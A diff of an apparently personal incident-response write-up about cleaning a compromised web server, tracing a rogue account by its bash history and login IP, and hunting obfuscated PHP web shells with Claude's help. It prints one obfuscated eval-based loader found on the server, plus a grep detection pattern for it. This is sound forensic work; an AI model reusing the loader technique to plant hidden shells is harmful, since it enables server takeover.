@@ -124,6 +124,8 @@ last
 # Check if the user creation is in the root's bash history
 grep "USERNAME" ~/.bash_history
 ```
+
+
 I found a user that stood out to me. I then found the user creation command in the root user's bash history account. The bash history had unix timestamps enabled and that user was created (according to the history timestamp) a minute before two other accounts which I know to be official.
 But when looking at `last` command's output, I enumerated their IP address with `ip-api.com` JSON API which showed me the user was connecting from a static IP in Washington DC. 
 I have my own alias on my host system to quickly enumerate an IP address:
@@ -133,6 +135,7 @@ enum_ip() {
 	curl -s "http://ip-api.com/json/$ip_address?fields=66846719" | jq
 }
 ```
+
 
 None of the official users were in the USA so I flagged it and confirmed with my client. No one to his knowledge was operating out of the States. I didn't take any action on the user account yet as I wanted to script the removal of any connections and user accounts to prevent any counter attacks should the attackers be actively monitoring such actions.
 
@@ -153,12 +156,14 @@ Now I bought myself some time to dig... and dig I did :D
 
 ## Finding Persistence
 
-I checked the active connections again and saw that the only active connection was mine and the hosting provider. I then explained to Claude my findings and actions, and prompted it to help give me places to look for any malicious scripts based on the current evidences.
+I checked the active connections again and saw that the only active connection were mine and the hosting provider. I then explained to Claude my findings and actions, and prompted it to help give me places to look for any malicious scripts based on the current evidences.
  
 The focus then turned to the /home directory and Claude gave me the following line:
 ```bash
 stat /home/user/public_html/shell.php
 ```
+
+
 My first thought was "who would be stupid enough to leave a malicious script on a server named script.php?". I laughed and said to myself, "What the hell, let's just see what comes up"
 ```bash
 # Find all the files under the /home directory named script
@@ -174,14 +179,19 @@ At this point my heart started racing with excitement, I'm sure we all know the 
 $JIzk='file_ge'.'t'.'content'.'s';$YrdE='gzu'.'ncomp'.'ress';$esyt='s'.'ubs'.'tr';$DPAQ='st'.'r'.''.'re'.'place';$TprW='e'.'xit';eval($YrdE($DPAQ('xpkzchjbsq','>',$DPAQ('qpfxhbaelk','<',$esyt($JIzk( _FILE_ ),-217718)))));$TprW(0);
 ?>
 ```
+
+
 BOOM! Text book obfuscation, great. I then went back to my text file and looked for more paths like it and found another 3 of them:  
 **`/home/REDACTED/public_html/images/npmrlch/cywartd/vjaqbug/shell.php`**  
 **`/home/REDACTED/public_html/modules/mod_login/elhywdo/cuywi1b/bwsax1e/shell.php`**  
 **`/home/REDACTED/public_html/images/sfvratq/heyxoca/pvynrqk/shell.php`**  
 
+
 In each of them I saw the obfuscation was slightly different and the variable names were completely different everytime but still easy enough to read but one thing stood out amongst them all **`(__FILE__),-OFFSET`**  
 I then asked Claude to give me the best way to find all of these files across the file system using this regex **`\( __FILE__ \),-[0-9]+`** 
-In hide sight, this was not the best way to find them but it worked.
+
+
+In hind sight, this was not the best way to find them but it worked.
 ```bash
 # Find all the php files with this pattern in them under first all the webroot folders then the filesystem
 grep -rnP '\( __FILE__ \),-[0-9]+' --include="*.php" /home/*/public_html/ >> possible_malware.txt
